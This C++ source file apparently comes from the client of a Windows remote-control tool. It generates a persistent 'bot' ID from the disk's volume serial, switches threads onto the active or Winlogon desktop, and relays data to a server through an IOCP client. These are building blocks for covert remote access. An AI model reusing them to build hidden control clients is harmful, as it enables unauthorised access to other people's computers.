// Manager.cpp: implementation of the CManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "Manager.h"
#include "IOCPClient.h"
#include <process.h>

typedef struct {
    unsigned(__stdcall* start_address)(void*);
    void* arglist;
    bool	bInteractive; // 是否支持交互桌面
    HANDLE	hEventTransferArg;
} THREAD_ARGLIST, * LPTHREAD_ARGLIST;

HDESK SelectDesktop(TCHAR* name);

unsigned int __stdcall ThreadLoader(LPVOID param)
{
    unsigned int	nRet = 0;
    try {
        THREAD_ARGLIST	arg;
        memcpy(&arg, param, sizeof(arg));
        SetEvent(arg.hEventTransferArg);
        // 与桌面交互
        if (arg.bInteractive)
            SelectDesktop(NULL);

        nRet = arg.start_address(arg.arglist);
    } catch (...) {
    };
    return nRet;
}

HANDLE MyCreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
                      SIZE_T dwStackSize,                       // initial stack size
                      LPTHREAD_START_ROUTINE lpStartAddress,    // thread function
                      LPVOID lpParameter,                       // thread argument
                      DWORD dwCreationFlags,                    // creation option
                      LPDWORD lpThreadId, bool bInteractive)
{
    HANDLE	hThread = INVALID_HANDLE_VALUE;
    THREAD_ARGLIST	arg;
    arg.start_address = (unsigned(__stdcall*)(void*))lpStartAddress;
    arg.arglist = (void*)lpParameter;
    arg.bInteractive = bInteractive;
    arg.hEventTransferArg = CreateEvent(NULL, false, false, NULL);
    hThread = (HANDLE)_beginthreadex((void*)lpThreadAttributes, dwStackSize, ThreadLoader, &arg, dwCreationFlags, (unsigned*)lpThreadId);
    WaitForSingleObject(arg.hEventTransferArg, INFINITE);
    SAFE_CLOSE_HANDLE(arg.hEventTransferArg);

    return hThread;
}

ULONG PseudoRand(ULONG* seed)
{
    return (*seed = 1352459 * (*seed) + 2529004207);
}

std::string GetBotId()
{
#define _T(p) p
    TCHAR botId[35] = { 0 };
    TCHAR windowsDirectory[MAX_PATH] = {};
    TCHAR volumeName[8] = { 0 };
    DWORD seed = 0;

    if (GetWindowsDirectory(windowsDirectory, sizeof(windowsDirectory)))
        windowsDirectory[0] = _T('C');

    volumeName[0] = windowsDirectory[0];
    volumeName[1] = _T(':');
    volumeName[2] = _T('\\');
    volumeName[3] = _T('\0');

    GetVolumeInformation(volumeName, NULL, 0, &seed, 0, NULL, NULL, 0);

    GUID guid = {};
    guid.Data1 = PseudoRand(&seed);

    guid.Data2 = (USHORT)PseudoRand(&seed);
    guid.Data3 = (USHORT)PseudoRand(&seed);
    for (int i = 0; i < 8; i++)
        guid.Data4[i] = (UCHAR)PseudoRand(&seed);
    wsprintf(botId, _T("%08lX%04lX%lu"), guid.Data1, guid.Data3, *(ULONG*)&guid.Data4[2]);
    return botId;
#undef _T(p)
}

BOOL SelectHDESK(HDESK new_desktop)
{
    HDESK old_desktop = GetThreadDesktop(GetCurrentThreadId());

    DWORD dummy;
    char new_name[256];

    if (!GetUserObjectInformation(new_desktop, UOI_NAME, &new_name, 256, &dummy)) {
        return FALSE;
    }

    // Switch the desktop
    if (!SetThreadDesktop(new_desktop)) {
        return FALSE;
    }

    // Switched successfully - destroy the old desktop
    CloseDesktop(old_desktop);

    return TRUE;
}

HDESK OpenActiveDesktop(ACCESS_MASK dwDesiredAccess)
{
    if (dwDesiredAccess == 0) {
        dwDesiredAccess = DESKTOP_READOBJECTS | DESKTOP_WRITEOBJECTS;
    }

    HDESK hInputDesktop = OpenInputDesktop(0, FALSE, dwDesiredAccess);

    if (!hInputDesktop) {
        Mprintf("OpenInputDesktop failed: %d, trying Winlogon\n", GetLastError());

        HWINSTA hWinSta = OpenWindowStation("WinSta0", FALSE, WINSTA_ALL_ACCESS);
        if (hWinSta) {
            SetProcessWindowStation(hWinSta);
            hInputDesktop = OpenDesktop("Winlogon", 0, FALSE, dwDesiredAccess);
            if (!hInputDesktop) {
                Mprintf("OpenDesktop Winlogon failed: %d, trying Default\n", GetLastError());
                hInputDesktop = OpenDesktop("Default", 0, FALSE, dwDesiredAccess);
                if (!hInputDesktop) {
                    Mprintf("OpenDesktop Default failed: %d\n", GetLastError());
                }
            }
        } else {
            Mprintf("OpenWindowStation failed: %d\n", GetLastError());
        }
    }
    return hInputDesktop;
}

// 返回新桌面句柄，如果没有变化返回NULL
HDESK IsDesktopChanged(HDESK currentDesk, DWORD accessRights)
{
    HDESK hInputDesk = OpenActiveDesktop(accessRights);
    if (!hInputDesk) return NULL;

    if (!currentDesk) {
        return hInputDesk;
    } else {
        // 通过桌面名称判断是否真正变化
        char oldName[256] = { 0 };
        char newName[256] = { 0 };
        DWORD len = 0;
        GetUserObjectInformationA(currentDesk, UOI_NAME, oldName, sizeof(oldName), &len);
        GetUserObjectInformationA(hInputDesk, UOI_NAME, newName, sizeof(newName), &len);

        if (oldName[0] && newName[0] && strcmp(oldName, newName) != 0) {
            Mprintf("Desktop changed from '%s' to '%s'\n", oldName, newName);
            return hInputDesk;
        }
    }
    CloseDesktop(hInputDesk);
    return NULL;
}

// 桌面切换辅助函数：通过桌面名称比较判断是否需要切换
// 返回值：true表示桌面已切换，false表示桌面未变化
bool SwitchToDesktopIfChanged(HDESK& currentDesk, DWORD accessRights)
{
    HDESK hInputDesk = IsDesktopChanged(currentDesk, accessRights);

    if (hInputDesk) {
        if (currentDesk) {
            CloseDesktop(currentDesk);
        }
        currentDesk = hInputDesk;
        SetThreadDesktop(currentDesk);
        return true;
    }
    return false;
}

// - SelectDesktop(char *)
// Switches the current thread into a different desktop, by name
// Calling with a valid desktop name will place the thread in that desktop.
// Calling with a NULL name will place the thread in the current input desktop.
HDESK SelectDesktop(TCHAR* name)
{
    HDESK desktop = NULL;

    if (name != NULL) {
        // Attempt to open the named desktop
        desktop = OpenDesktop(name, 0, FALSE,
                              DESKTOP_CREATEMENU | DESKTOP_CREATEWINDOW |
                              DESKTOP_ENUMERATE | DESKTOP_HOOKCONTROL |
                              DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS |
                              DESKTOP_SWITCHDESKTOP | GENERIC_WRITE);
    } else {
        // No, so open the input desktop
        desktop = OpenInputDesktop(0, FALSE,
                                   DESKTOP_CREATEMENU | DESKTOP_CREATEWINDOW |
                                   DESKTOP_ENUMERATE | DESKTOP_HOOKCONTROL |
                                   DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS |
                                   DESKTOP_SWITCHDESKTOP | GENERIC_WRITE);
    }

    // Did we succeed?
    if (desktop == NULL) {
        return NULL;
    }

    // Switch to the new desktop
    if (!SelectHDESK(desktop)) {
        // Failed to enter the new desktop, so free it!
        CloseDesktop(desktop);
        return NULL;
    }

    // We successfully switched desktops!
    return desktop;
}

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CManager::CManager(IOCPClient* ClientObject) : g_bExit(ClientObject->GetState())
{
    m_bReady = TRUE;
    m_ClientObject = ClientObject;
    m_ClientObject->setManagerCallBack(this, IOCPManager::DataProcess, IOCPManager::ReconnectProcess);

    m_hEventDlgOpen = CreateEvent(NULL,TRUE,FALSE,NULL);
}

CManager::~CManager()
{
    if (m_hEventDlgOpen!=NULL) {
        SAFE_CLOSE_HANDLE(m_hEventDlgOpen);
        m_hEventDlgOpen = NULL;
    }
}


BOOL CManager::Send(LPBYTE lpData, UINT nSize)
{
    int	nRet = 0;
    try {
        nRet = m_ClientObject->Send2Server((char*)lpData, nSize);
    } catch(...) {
        Mprintf("[ERROR] CManager::Send catch an error \n");
    };
    return nRet;
}

VOID CManager::WaitForDialogOpen()
{
    WaitForSingleObject(m_hEventDlgOpen, 8000);
    //必须的Sleep,因为远程窗口从InitDialog中发送COMMAND_NEXT到显示还要一段时间
    Sleep(150);
}

VOID CManager::NotifyDialogIsOpen()
{
    SetEvent(m_hEventDlgOpen);
}
